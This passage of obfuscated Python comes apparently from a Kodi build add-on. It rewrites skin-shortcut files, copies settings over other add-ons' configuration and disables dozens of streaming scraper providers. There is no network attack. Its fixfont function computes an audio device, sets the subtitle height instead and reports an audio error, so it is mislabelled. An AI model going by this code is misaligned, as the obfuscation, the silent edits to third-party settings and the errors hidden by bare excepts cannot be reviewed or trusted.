		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1190
    with open (OO00O00O00O000O00 ,'w')as OO0OOOO000O000OO0 :#line:1193
      OO0OOOO000O000OO0 .write (O000O0000OOOO0O0O )#line:1194
    OO00O00O00O000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1196
    with open (OO00O00O00O000O00 ,'r')as OO0OOOO000O000OO0 :#line:1197
      O000O0000OOOO0O0O =OO0OOOO000O000OO0 .read ()#line:1198
    O000O0000OOOO0O0O =O000O0000OOOO0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1216
    with open (OO00O00O00O000O00 ,'w')as OO0OOOO000O000OO0 :#line:1219
      OO0OOOO000O000OO0 .write (O000O0000OOOO0O0O )#line:1220
    OO00O00O00O000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1222
    with open (OO00O00O00O000O00 ,'r')as OO0OOOO000O000OO0 :#line:1223
      O000O0000OOOO0O0O =OO0OOOO000O000OO0 .read ()#line:1224
    O000O0000OOOO0O0O =O000O0000OOOO0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1242
    with open (OO00O00O00O000O00 ,'w')as OO0OOOO000O000OO0 :#line:1245
      OO0OOOO000O000OO0 .write (O000O0000OOOO0O0O )#line:1246
    OO00O00O00O000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1249
    with open (OO00O00O00O000O00 ,'r')as OO0OOOO000O000OO0 :#line:1250
      O000O0000OOOO0O0O =OO0OOOO000O000OO0 .read ()#line:1251
    O000O0000OOOO0O0O =O000O0000OOOO0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1269
    with open (OO00O00O00O000O00 ,'w')as OO0OOOO000O000OO0 :#line:1272
      OO0OOOO000O000OO0 .write (O000O0000OOOO0O0O )#line:1273
def rdbuildinstallON ():#line:1276
    try :#line:1278
       O0OO0O000O00000OO =ADDONPATH +"/resources/rd/victory.xml"#line:1279
       O0OOO000OOO0OO0O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1280
       copyfile (O0OO0O000O00000OO ,O0OOO000OOO0OO0O0 )#line:1282
       O0OO0O000O00000OO =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1284
       O0OOO000OOO0OO0O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1285
       copyfile (O0OO0O000O00000OO ,O0OOO000OOO0OO0O0 )#line:1287
       O0OO0O000O00000OO =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1289
       O0OOO000OOO0OO0O0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1290
       copyfile (O0OO0O000O00000OO ,O0OOO000OOO0OO0O0 )#line:1292
       O0OO0O000O00000OO =ADDONPATH +"/resources/rd/Splash.png"#line:1295
       O0OOO000OOO0OO0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1296
       copyfile (O0OO0O000O00000OO ,O0OOO000OOO0OO0O0 )#line:1298
    except :#line:1300
       pass #line:1301
def rdbuild ():#line:1311
	O00O0OO00OOO0OO0O =(ADDON .getSetting ("rdbuild"))#line:1312
	if O00O0OO00OOO0OO0O =='true':#line:1313
		OOO0OO0O00OO00O00 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1314
		OOO0OO0O00OO00O00 .setSetting ('all_t','0')#line:1315
		OOO0OO0O00OO00O00 .setSetting ('rd_menu_enable','false')#line:1316
		OOO0OO0O00OO00O00 .setSetting ('magnet_bay','false')#line:1317
		OOO0OO0O00OO00O00 .setSetting ('magnet_extra','false')#line:1318
		OOO0OO0O00OO00O00 .setSetting ('rd_only','false')#line:1319
		OOO0OO0O00OO00O00 .setSetting ('ftp','false')#line:1321
		OOO0OO0O00OO00O00 .setSetting ('fp','false')#line:1322
		OOO0OO0O00OO00O00 .setSetting ('filter_fp','false')#line:1323
		OOO0OO0O00OO00O00 .setSetting ('fp_size_en','false')#line:1324
		OOO0OO0O00OO00O00 .setSetting ('afdah','false')#line:1325
		OOO0OO0O00OO00O00 .setSetting ('ap2s','false')#line:1326
		OOO0OO0O00OO00O00 .setSetting ('cin','false')#line:1327
		OOO0OO0O00OO00O00 .setSetting ('clv','false')#line:1328
		OOO0OO0O00OO00O00 .setSetting ('cmv','false')#line:1329
		OOO0OO0O00OO00O00 .setSetting ('dl20','false')#line:1330
		OOO0OO0O00OO00O00 .setSetting ('esc','false')#line:1331
		OOO0OO0O00OO00O00 .setSetting ('extra','false')#line:1332
		OOO0OO0O00OO00O00 .setSetting ('film','false')#line:1333
		OOO0OO0O00OO00O00 .setSetting ('fre','false')#line:1334
		OOO0OO0O00OO00O00 .setSetting ('fxy','false')#line:1335
		OOO0OO0O00OO00O00 .setSetting ('genv','false')#line:1336
		OOO0OO0O00OO00O00 .setSetting ('getgo','false')#line:1337
		OOO0OO0O00OO00O00 .setSetting ('gold','false')#line:1338
		OOO0OO0O00OO00O00 .setSetting ('gona','false')#line:1339
		OOO0OO0O00OO00O00 .setSetting ('hdmm','false')#line:1340
		OOO0OO0O00OO00O00 .setSetting ('hdt','false')#line:1341
		OOO0OO0O00OO00O00 .setSetting ('icy','false')#line:1342
		OOO0OO0O00OO00O00 .setSetting ('ind','false')#line:1343
		OOO0OO0O00OO00O00 .setSetting ('iwi','false')#line:1344
		OOO0OO0O00OO00O00 .setSetting ('jen_free','false')#line:1345
		OOO0OO0O00OO00O00 .setSetting ('kiss','false')#line:1346
		OOO0OO0O00OO00O00 .setSetting ('lavin','false')#line:1347
		OOO0OO0O00OO00O00 .setSetting ('los','false')#line:1348
		OOO0OO0O00OO00O00 .setSetting ('m4u','false')#line:1349
		OOO0OO0O00OO00O00 .setSetting ('mesh','false')#line:1350
		OOO0OO0O00OO00O00 .setSetting ('mf','false')#line:1351
		OOO0OO0O00OO00O00 .setSetting ('mkvc','false')#line:1352
		OOO0OO0O00OO00O00 .setSetting ('mjy','false')#line:1353
		OOO0OO0O00OO00O00 .setSetting ('hdonline','false')#line:1354
		OOO0OO0O00OO00O00 .setSetting ('moviex','false')#line:1355
		OOO0OO0O00OO00O00 .setSetting ('mpr','false')#line:1356
		OOO0OO0O00OO00O00 .setSetting ('mvg','false')#line:1357
		OOO0OO0O00OO00O00 .setSetting ('mvl','false')#line:1358
		OOO0OO0O00OO00O00 .setSetting ('mvs','false')#line:1359
		OOO0OO0O00OO00O00 .setSetting ('myeg','false')#line:1360
		OOO0OO0O00OO00O00 .setSetting ('ninja','false')#line:1361
		OOO0OO0O00OO00O00 .setSetting ('odb','false')#line:1362
		OOO0OO0O00OO00O00 .setSetting ('ophd','false')#line:1363
		OOO0OO0O00OO00O00 .setSetting ('pks','false')#line:1364
		OOO0OO0O00OO00O00 .setSetting ('prf','false')#line:1365
		OOO0OO0O00OO00O00 .setSetting ('put18','false')#line:1366
		OOO0OO0O00OO00O00 .setSetting ('req','false')#line:1367
		OOO0OO0O00OO00O00 .setSetting ('rftv','false')#line:1368
		OOO0OO0O00OO00O00 .setSetting ('rltv','false')#line:1369
		OOO0OO0O00OO00O00 .setSetting ('sc','false')#line:1370
		OOO0OO0O00OO00O00 .setSetting ('seehd','false')#line:1371
		OOO0OO0O00OO00O00 .setSetting ('showbox','false')#line:1372
		OOO0OO0O00OO00O00 .setSetting ('shuid','false')#line:1373
		OOO0OO0O00OO00O00 .setSetting ('sil_gh','false')#line:1374
		OOO0OO0O00OO00O00 .setSetting ('spv','false')#line:1375
		OOO0OO0O00OO00O00 .setSetting ('subs','false')#line:1376
		OOO0OO0O00OO00O00 .setSetting ('tvs','false')#line:1377
		OOO0OO0O00OO00O00 .setSetting ('tw','false')#line:1378
		OOO0OO0O00OO00O00 .setSetting ('upto','false')#line:1379
		OOO0OO0O00OO00O00 .setSetting ('vel','false')#line:1380
		OOO0OO0O00OO00O00 .setSetting ('vex','false')#line:1381
		OOO0OO0O00OO00O00 .setSetting ('vidc','false')#line:1382
		OOO0OO0O00OO00O00 .setSetting ('w4hd','false')#line:1383
		OOO0OO0O00OO00O00 .setSetting ('wav','false')#line:1384
		OOO0OO0O00OO00O00 .setSetting ('wf','false')#line:1385
		OOO0OO0O00OO00O00 .setSetting ('wse','false')#line:1386
		OOO0OO0O00OO00O00 .setSetting ('wss','false')#line:1387
		OOO0OO0O00OO00O00 .setSetting ('wsse','false')#line:1388
		OOO0OO0O00OO00O00 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1389
		OOO0OO0O00OO00O00 .setSetting ('debrid.only','true')#line:1390
		OOO0OO0O00OO00O00 .setSetting ('hosts.captcha','false')#line:1391
		OOO0OO0O00OO00O00 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1392
		OOO0OO0O00OO00O00 .setSetting ('provider.123moviehd','false')#line:1393
		OOO0OO0O00OO00O00 .setSetting ('provider.300mbdownload','false')#line:1394
		OOO0OO0O00OO00O00 .setSetting ('provider.alltube','false')#line:1395
		OOO0OO0O00OO00O00 .setSetting ('provider.allucde','false')#line:1396
		OOO0OO0O00OO00O00 .setSetting ('provider.animebase','false')#line:1397
		OOO0OO0O00OO00O00 .setSetting ('provider.animeloads','false')#line:1398
		OOO0OO0O00OO00O00 .setSetting ('provider.animetoon','false')#line:1399
		OOO0OO0O00OO00O00 .setSetting ('provider.bnwmovies','false')#line:1400
		OOO0OO0O00OO00O00 .setSetting ('provider.boxfilm','false')#line:1401
		OOO0OO0O00OO00O00 .setSetting ('provider.bs','false')#line:1402
		OOO0OO0O00OO00O00 .setSetting ('provider.cartoonhd','false')#line:1403
		OOO0OO0O00OO00O00 .setSetting ('provider.cdahd','false')#line:1404
		OOO0OO0O00OO00O00 .setSetting ('provider.cdax','false')#line:1405
		OOO0OO0O00OO00O00 .setSetting ('provider.cine','false')#line:1406
		OOO0OO0O00OO00O00 .setSetting ('provider.cinenator','false')#line:1407
		OOO0OO0O00OO00O00 .setSetting ('provider.cmovieshdbz','false')#line:1408
		OOO0OO0O00OO00O00 .setSetting ('provider.coolmoviezone','false')#line:1409
		OOO0OO0O00OO00O00 .setSetting ('provider.ddl','false')#line:1410
		OOO0OO0O00OO00O00 .setSetting ('provider.deepmovie','false')#line:1411
		OOO0OO0O00OO00O00 .setSetting ('provider.ekinomaniak','false')#line:1412
		OOO0OO0O00OO00O00 .setSetting ('provider.ekinotv','false')#line:1413
		OOO0OO0O00OO00O00 .setSetting ('provider.filiser','false')#line:1414
		OOO0OO0O00OO00O00 .setSetting ('provider.filmpalast','false')#line:1415
		OOO0OO0O00OO00O00 .setSetting ('provider.filmwebbooster','false')#line:1416
		OOO0OO0O00OO00O00 .setSetting ('provider.filmxy','false')#line:1417
		OOO0OO0O00OO00O00 .setSetting ('provider.fmovies','false')#line:1418
		OOO0OO0O00OO00O00 .setSetting ('provider.foxx','false')#line:1419
		OOO0OO0O00OO00O00 .setSetting ('provider.freefmovies','false')#line:1420
		OOO0OO0O00OO00O00 .setSetting ('provider.freeputlocker','false')#line:1421
		OOO0OO0O00OO00O00 .setSetting ('provider.furk','false')#line:1422
		OOO0OO0O00OO00O00 .setSetting ('provider.gamatotv','false')#line:1423
		OOO0OO0O00OO00O00 .setSetting ('provider.gogoanime','false')#line:1424
		OOO0OO0O00OO00O00 .setSetting ('provider.gowatchseries','false')#line:1425
		OOO0OO0O00OO00O00 .setSetting ('provider.hackimdb','false')#line:1426
		OOO0OO0O00OO00O00 .setSetting ('provider.hdfilme','false')#line:1427
		OOO0OO0O00OO00O00 .setSetting ('provider.hdmto','false')#line:1428
		OOO0OO0O00OO00O00 .setSetting ('provider.hdpopcorns','false')#line:1429
		OOO0OO0O00OO00O00 .setSetting ('provider.hdstreams','false')#line:1430
		OOO0OO0O00OO00O00 .setSetting ('provider.horrorkino','false')#line:1432
		OOO0OO0O00OO00O00 .setSetting ('provider.iitv','false')#line:1433
		OOO0OO0O00OO00O00 .setSetting ('provider.iload','false')#line:1434
		OOO0OO0O00OO00O00 .setSetting ('provider.iwaatch','false')#line:1435
		OOO0OO0O00OO00O00 .setSetting ('provider.kinodogs','false')#line:1436
		OOO0OO0O00OO00O00 .setSetting ('provider.kinoking','false')#line:1437
		OOO0OO0O00OO00O00 .setSetting ('provider.kinow','false')#line:1438
		OOO0OO0O00OO00O00 .setSetting ('provider.kinox','false')#line:1439
		OOO0OO0O00OO00O00 .setSetting ('provider.lichtspielhaus','false')#line:1440
		OOO0OO0O00OO00O00 .setSetting ('provider.liomenoi','false')#line:1441
		OOO0OO0O00OO00O00 .setSetting ('provider.magnetdl','false')#line:1444
		OOO0OO0O00OO00O00 .setSetting ('provider.megapelistv','false')#line:1445
		OOO0OO0O00OO00O00 .setSetting ('provider.movie2k-ac','false')#line:1446
		OOO0OO0O00OO00O00 .setSetting ('provider.movie2k-ag','false')#line:1447
		OOO0OO0O00OO00O00 .setSetting ('provider.movie2z','false')#line:1448
		OOO0OO0O00OO00O00 .setSetting ('provider.movie4k','false')#line:1449
		OOO0OO0O00OO00O00 .setSetting ('provider.movie4kis','false')#line:1450
		OOO0OO0O00OO00O00 .setSetting ('provider.movieneo','false')#line:1451
		OOO0OO0O00OO00O00 .setSetting ('provider.moviesever','false')#line:1452
		OOO0OO0O00OO00O00 .setSetting ('provider.movietown','false')#line:1453
		OOO0OO0O00OO00O00 .setSetting ('provider.mvrls','false')#line:1455
		OOO0OO0O00OO00O00 .setSetting ('provider.netzkino','false')#line:1456
		OOO0OO0O00OO00O00 .setSetting ('provider.odb','false')#line:1457
		OOO0OO0O00OO00O00 .setSetting ('provider.openkatalog','false')#line:1458
		OOO0OO0O00OO00O00 .setSetting ('provider.ororo','false')#line:1459
		OOO0OO0O00OO00O00 .setSetting ('provider.paczamy','false')#line:1460
		OOO0OO0O00OO00O00 .setSetting ('provider.peliculasdk','false')#line:1461
		OOO0OO0O00OO00O00 .setSetting ('provider.pelisplustv','false')#line:1462
		OOO0OO0O00OO00O00 .setSetting ('provider.pepecine','false')#line:1463
		OOO0OO0O00OO00O00 .setSetting ('provider.primewire','false')#line:1464
		OOO0OO0O00OO00O00 .setSetting ('provider.projectfreetv','false')#line:1465
		OOO0OO0O00OO00O00 .setSetting ('provider.proxer','false')#line:1466
		OOO0OO0O00OO00O00 .setSetting ('provider.pureanime','false')#line:1467
		OOO0OO0O00OO00O00 .setSetting ('provider.putlocker','false')#line:1468
		OOO0OO0O00OO00O00 .setSetting ('provider.putlockerfree','false')#line:1469
		OOO0OO0O00OO00O00 .setSetting ('provider.reddit','false')#line:1470
		OOO0OO0O00OO00O00 .setSetting ('provider.cartoonwire','false')#line:1471
		OOO0OO0O00OO00O00 .setSetting ('provider.seehd','false')#line:1472
		OOO0OO0O00OO00O00 .setSetting ('provider.segos','false')#line:1473
		OOO0OO0O00OO00O00 .setSetting ('provider.serienstream','false')#line:1474
		OOO0OO0O00OO00O00 .setSetting ('provider.series9','false')#line:1475
		OOO0OO0O00OO00O00 .setSetting ('provider.seriesever','false')#line:1476
		OOO0OO0O00OO00O00 .setSetting ('provider.seriesonline','false')#line:1477
		OOO0OO0O00OO00O00 .setSetting ('provider.seriespapaya','false')#line:1478
		OOO0OO0O00OO00O00 .setSetting ('provider.sezonlukdizi','false')#line:1479
		OOO0OO0O00OO00O00 .setSetting ('provider.solarmovie','false')#line:1480
		OOO0OO0O00OO00O00 .setSetting ('provider.solarmoviez','false')#line:1481
		OOO0OO0O00OO00O00 .setSetting ('provider.stream-to','false')#line:1482
		OOO0OO0O00OO00O00 .setSetting ('provider.streamdream','false')#line:1483
		OOO0OO0O00OO00O00 .setSetting ('provider.streamflix','false')#line:1484
		OOO0OO0O00OO00O00 .setSetting ('provider.streamit','false')#line:1485
		OOO0OO0O00OO00O00 .setSetting ('provider.swatchseries','false')#line:1486
		OOO0OO0O00OO00O00 .setSetting ('provider.szukajkatv','false')#line:1487
		OOO0OO0O00OO00O00 .setSetting ('provider.tainiesonline','false')#line:1488
		OOO0OO0O00OO00O00 .setSetting ('provider.tainiomania','false')#line:1489
		OOO0OO0O00OO00O00 .setSetting ('provider.tata','false')#line:1492
		OOO0OO0O00OO00O00 .setSetting ('provider.trt','false')#line:1493
		OOO0OO0O00OO00O00 .setSetting ('provider.tvbox','false')#line:1494
		OOO0OO0O00OO00O00 .setSetting ('provider.ultrahd','false')#line:1495
		OOO0OO0O00OO00O00 .setSetting ('provider.video4k','false')#line:1496
		OOO0OO0O00OO00O00 .setSetting ('provider.vidics','false')#line:1497
		OOO0OO0O00OO00O00 .setSetting ('provider.view4u','false')#line:1498
		OOO0OO0O00OO00O00 .setSetting ('provider.watchseries','false')#line:1499
		OOO0OO0O00OO00O00 .setSetting ('provider.xrysoi','false')#line:1500
		OOO0OO0O00OO00O00 .setSetting ('provider.library','false')#line:1501
def fixfont ():#line:1504
	OO00OO0O0OOO00OO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1505
	O0O0OO000OO00OOO0 =json .loads (OO00OO0O0OOO00OO0 );#line:1507
	O00O0O0000O00O0O0 =O0O0OO000OO00OOO0 ["result"]["settings"]#line:1508
	OOOO00OOO0O0OO000 =[OO0000OOOOO0O00O0 for OO0000OOOOO0O00O0 in O00O0O0000O00O0O0 if OO0000OOOOO0O00O0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1510
	OO0000OO0O0000000 =OOOO00OOO0O0OO000 ["options"];#line:1511
	O0OOO000OOO000O0O =OOOO00OOO0O0OO000 ["value"];#line:1512
	OO0OOOOO000O0O000 =[OO0000O0O0O0000O0 for (OO0000O0O0O0000O0 ,OO0O000O0000O0000 )in enumerate (OO0000OO0O0000000 )if OO0O000O0000O0000 ["value"]==O0OOO000OOO000O0O ][0 ];#line:1514
	OOOOO00O00OO0OOOO =(OO0OOOOO000O0O000 +1 )%len (OO0000OO0O0000000 )#line:1516
	OO0O000O0OOO000O0 =OO0000OO0O0000000 [OOOOO00O00OO0OOOO ]["value"]#line:1518
	O000O0OOO0O00O0OO =OO0000OO0O0000000 [OOOOO00O00OO0OOOO ]["label"]#line:1519
	OOO00O0O0OO000OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1521
	try :#line:1523
		OO0OO000O00OO0O0O =json .loads (OOO00O0O0OO000OOO );#line:1524
		if OO0OO000O00OO0O0O ["result"]!=True :#line:1526
			raise Exception #line:1527
	except :#line:1528
		sys .stderr .write ("Error switching audio output device")#line:1529
		raise Exception #line:1530
def parseDOM2 (O000O00OOOO0000OO ,name =u"",attrs ={},ret =False ):#line:1531
	if isinstance (O000O00OOOO0000OO ,str ):#line:1534
		try :#line:1535
			O000O00OOOO0000OO =[O000O00OOOO0000OO .decode ("utf-8")]#line:1536
		except :#line:1537
			O000O00OOOO0000OO =[O000O00OOOO0000OO ]#line:1538
	elif isinstance (O000O00OOOO0000OO ,unicode ):#line:1539
		O000O00OOOO0000OO =[O000O00OOOO0000OO ]#line:1540
	elif not isinstance (O000O00OOOO0000OO ,list ):#line:1541
		return u""#line:1542
	if not name .strip ():#line:1544
		return u""#line:1545
	O0O0O0O0OOOO0OO00 =[]#line:1547
	for O00O0000000OOOO00 in O000O00OOOO0000OO :#line:1548
		O00O0O00OO000O0O0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O00O0000000OOOO00 )#line:1549
		for OOO00O0000OO00000 in O00O0O00OO000O0O0 :#line:1550
			O00O0000000OOOO00 =O00O0000000OOOO00 .replace (OOO00O0000OO00000 ,OOO00O0000OO00000 .replace ("\n"," "))#line:1551
		O0OOO0OO0O0OO0OOO =[]#line:1553
		for OOO00O0O00OO00O00 in attrs :#line:1554
			OO0O00O0000OO0OO0 =re .compile ('(<'+name +'[^>]*?(?:'+OOO00O0O00OO00O00 +'=[\'"]'+attrs [OOO00O0O00OO00O00 ]+'[\'"].*?>))',re .M |re .S ).findall (O00O0000000OOOO00 )#line:1555
			if len (OO0O00O0000OO0OO0 )==0 and attrs [OOO00O0O00OO00O00 ].find (" ")==-1 :#line:1556
				OO0O00O0000OO0OO0 =re .compile ('(<'+name +'[^>]*?(?:'+OOO00O0O00OO00O00 +'='+attrs [OOO00O0O00OO00O00 ]+'.*?>))',re .M |re .S ).findall (O00O0000000OOOO00 )#line:1557
			if len (O0OOO0OO0O0OO0OOO )==0 :#line:1559
				O0OOO0OO0O0OO0OOO =OO0O00O0000OO0OO0 #line:1560
				OO0O00O0000OO0OO0 =[]#line:1561
			else :#line:1562
				OO0OOOOOO000000OO =range (len (O0OOO0OO0O0OO0OOO ))#line:1563
				OO0OOOOOO000000OO .reverse ()#line:1564
				for OOOO00O0OOO0O000O in OO0OOOOOO000000OO :#line:1565
					if not O0OOO0OO0O0OO0OOO [OOOO00O0OOO0O000O ]in OO0O00O0000OO0OO0 :#line:1566
						del (O0OOO0OO0O0OO0OOO [OOOO00O0OOO0O000O ])#line:1567
		if len (O0OOO0OO0O0OO0OOO )==0 and attrs =={}:#line:1569
			O0OOO0OO0O0OO0OOO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O00O0000000OOOO00 )#line:1570
			if len (O0OOO0OO0O0OO0OOO )==0 :#line:1571
				O0OOO0OO0O0OO0OOO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O00O0000000OOOO00 )#line:1572
		if isinstance (ret ,str ):#line:1574
			OO0O00O0000OO0OO0 =[]#line:1575
			for OOO00O0000OO00000 in O0OOO0OO0O0OO0OOO :#line:1576
				OO0O0000OOOOOO000 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOO00O0000OO00000 )#line:1577
				if len (OO0O0000OOOOOO000 )==0 :#line:1578
					OO0O0000OOOOOO000 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOO00O0000OO00000 )#line:1579
				for OO0O000OO0OOOOOOO in OO0O0000OOOOOO000 :#line:1580
					OO000O000OO000OOO =OO0O000OO0OOOOOOO [0 ]#line:1581
					if OO000O000OO000OOO in "'\"":#line:1582
						if OO0O000OO0OOOOOOO .find ('='+OO000O000OO000OOO ,OO0O000OO0OOOOOOO .find (OO000O000OO000OOO ,1 ))>-1 :#line:1583
							OO0O000OO0OOOOOOO =OO0O000OO0OOOOOOO [:OO0O000OO0OOOOOOO .find ('='+OO000O000OO000OOO ,OO0O000OO0OOOOOOO .find (OO000O000OO000OOO ,1 ))]#line:1584
						if OO0O000OO0OOOOOOO .rfind (OO000O000OO000OOO ,1 )>-1 :#line:1586
							OO0O000OO0OOOOOOO =OO0O000OO0OOOOOOO [1 :OO0O000OO0OOOOOOO .rfind (OO000O000OO000OOO )]#line:1587
					else :#line:1588
						if OO0O000OO0OOOOOOO .find (" ")>0 :#line:1589
							OO0O000OO0OOOOOOO =OO0O000OO0OOOOOOO [:OO0O000OO0OOOOOOO .find (" ")]#line:1590
						elif OO0O000OO0OOOOOOO .find ("/")>0 :#line:1591
							OO0O000OO0OOOOOOO =OO0O000OO0OOOOOOO [:OO0O000OO0OOOOOOO .find ("/")]#line:1592
						elif OO0O000OO0OOOOOOO .find (">")>0 :#line:1593
							OO0O000OO0OOOOOOO =OO0O000OO0OOOOOOO [:OO0O000OO0OOOOOOO .find (">")]#line:1594
					OO0O00O0000OO0OO0 .append (OO0O000OO0OOOOOOO .strip ())#line:1596
			O0OOO0OO0O0OO0OOO =OO0O00O0000OO0OO0 #line:1597
		else :#line:1598
			OO0O00O0000OO0OO0 =[]#line:1599
			for OOO00O0000OO00000 in O0OOO0OO0O0OO0OOO :#line:1600
				OO00O00O0O00OOO00 =u"</"+name #line:1601
				O0OOOOO00O00O0OO0 =O00O0000000OOOO00 .find (OOO00O0000OO00000 )#line:1603
				OO00OOO000O0OO000 =O00O0000000OOOO00 .find (OO00O00O0O00OOO00 ,O0OOOOO00O00O0OO0 )#line:1604
				O0OO00OO0OO0OO0O0 =O00O0000000OOOO00 .find ("<"+name ,O0OOOOO00O00O0OO0 +1 )#line:1605
				while O0OO00OO0OO0OO0O0 <OO00OOO000O0OO000 and O0OO00OO0OO0OO0O0 !=-1 :#line:1607
					OOO0O00OO0O0O0O00 =O00O0000000OOOO00 .find (OO00O00O0O00OOO00 ,OO00OOO000O0OO000 +len (OO00O00O0O00OOO00 ))#line:1608
					if OOO0O00OO0O0O0O00 !=-1 :#line:1609
						OO00OOO000O0OO000 =OOO0O00OO0O0O0O00 #line:1610
					O0OO00OO0OO0OO0O0 =O00O0000000OOOO00 .find ("<"+name ,O0OO00OO0OO0OO0O0 +1 )#line:1611
				if O0OOOOO00O00O0OO0 ==-1 and OO00OOO000O0OO000 ==-1 :#line:1613
					OOOO0O0OO0O00O0OO =u""#line:1614
				elif O0OOOOO00O00O0OO0 >-1 and OO00OOO000O0OO000 >-1 :#line:1615
					OOOO0O0OO0O00O0OO =O00O0000000OOOO00 [O0OOOOO00O00O0OO0 +len (OOO00O0000OO00000 ):OO00OOO000O0OO000 ]#line:1616
				elif OO00OOO000O0OO000 >-1 :#line:1617
					OOOO0O0OO0O00O0OO =O00O0000000OOOO00 [:OO00OOO000O0OO000 ]#line:1618
				elif O0OOOOO00O00O0OO0 >-1 :#line:1619
					OOOO0O0OO0O00O0OO =O00O0000000OOOO00 [O0OOOOO00O00O0OO0 +len (OOO00O0000OO00000 ):]#line:1620
				if ret :#line:1622
					OO00O00O0O00OOO00 =O00O0000000OOOO00 [OO00OOO000O0OO000 :O00O0000000OOOO00 .find (">",O00O0000000OOOO00 .find (OO00O00O0O00OOO00 ))+1 ]#line:1623
					OOOO0O0OO0O00O0OO =OOO00O0000OO00000 +OOOO0O0OO0O00O0OO +OO00O00O0O00OOO00 #line:1624
				O00O0000000OOOO00 =O00O0000000OOOO00 [O00O0000000OOOO00 .find (OOOO0O0OO0O00O0OO ,O00O0000000OOOO00 .find (OOO00O0000OO00000 ))+len (OOOO0O0OO0O00O0OO ):]#line:1626
				OO0O00O0000OO0OO0 .append (OOOO0O0OO0O00O0OO )#line:1627
			O0OOO0OO0O0OO0OOO =OO0O00O0000OO0OO0 #line:1628
		O0O0O0O0OOOO0OO00 +=O0OOO0OO0O0OO0OOO #line:1629
	return O0O0O0O0OOOO0OO00 #line:1631
def addItem (O0OO0000OOOOO000O ,O00OOO0O00O00OOOO ,OO0OOO0O0OOOOO00O ,OOOO0OO00OOO00OOO ,O0OO0OOO00O00OO00 ,description =None ):#line:1633
	if description ==None :description =''#line:1634
	description ='[COLOR white]'+description +'[/COLOR]'#line:1635
	O00O00000000O0O0O =sys .argv [0 ]+"?url="+urllib .quote_plus (O00OOO0O00O00OOOO )+"&mode="+str (OO0OOO0O0OOOOO00O )+"&name="+urllib .quote_plus (O0OO0000OOOOO000O )+"&iconimage="+urllib .quote_plus (OOOO0OO00OOO00OOO )+"&fanart="+urllib .quote_plus (O0OO0OOO00O00OO00 )#line:1636
	O0O00OO00OOOOO0OO =True #line:1637
	OO00OOO0O0000O00O =xbmcgui .ListItem (O0OO0000OOOOO000O ,iconImage =OOOO0OO00OOO00OOO ,thumbnailImage =OOOO0OO00OOO00OOO )#line:1638
	OO00OOO0O0000O00O .setInfo (type ="Video",infoLabels ={"Title":O0OO0000OOOOO000O ,"Plot":description })#line:1639
	OO00OOO0O0000O00O .setProperty ("fanart_Image",O0OO0OOO00O00OO00 )#line:1640
